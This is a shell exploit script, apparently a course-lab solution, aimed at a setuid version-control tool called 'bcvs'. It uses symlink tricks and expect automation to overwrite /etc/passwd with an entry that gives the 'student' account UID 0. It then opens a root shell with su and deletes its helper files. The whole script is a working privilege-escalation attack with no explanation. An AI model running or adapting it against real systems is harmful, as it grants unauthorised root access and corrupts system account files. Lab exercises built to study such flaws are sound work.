#!/bin/sh
cd /opt/bcvs
touch subprocess.py
touch file.txt
cat << EOF >> subprocess.py
import os, errno
src ='.bcvs/block.list'
dst = 'file.txt'
try:
    os.symlink(src, dst)
except OSError as e:
    if e.errno == errno.EEXIST:
        os.remove(dst)
        os.symlink(src, dst)
    else:
        raise e
EOF

touch run.sh 
cat << EOF >> run.sh
#!/bin/sh
sleep 5
python subprocess.py
EOF

./bcvs ci file.txt << EOF 
"HELLO"
EOF

touch passwd
PASSWORD="passwd"
echo root:x:0:0::/root:/bin/bash >> $PASSWORD
echo student:x:0:0::/root:/bin/bash >> $PASSWORD

touch stuff.exp
cat << EOF >> stuff.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs ci passwd
expect "Please write a SHORT explanation:\r"
send -- "anything3\r"
expect eof
EOF

touch both.exp
cat << EOF >> both.exp
#!/usr/bin/expect -f 
set timeout -1
spawn ./bcvs co file.txt
expect eof
EOF


touch firstexp.exp
cat << EOF >> firstexp.exp
#!/usr/bin/expect -f 
set timeout -1
spawn ./bcvs co file.txt
expect "Please write a SHORT explanation:\r"
sleep 4
send -- "anything1\r"
expect eof
EOF

touch secondexp.exp
cat << EOF >> secondexp.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs co passwd
expect "Please write a SHORT explanation:\r"
send -- "anything2\r"
expect eof 
EOF

touch thirdexp.exp
cat << EOF >> thirdexp.exp
#!/usr/bin/expect -f
set timeout -1
spawn su student
expect "Password:"
send -- "security\r"
interact
expect eof
EOF

chmod +x run.sh
chmod +x stuff.exp
chmod +x firstexp.exp
chmod +x both.exp

./stuff.exp
./both.exp
chmod +x secondexp.exp
chmod +x thirdexp.exp
rm passwd
ln -s /etc/passwd passwd
./secondexp.exp
./thirdexp.exp
rm secondexp.exp
rm thirdexp.exp
rm firstexp.exp
rm subprocess.py
rm passwd
rm file.txt
rm stuff.exp
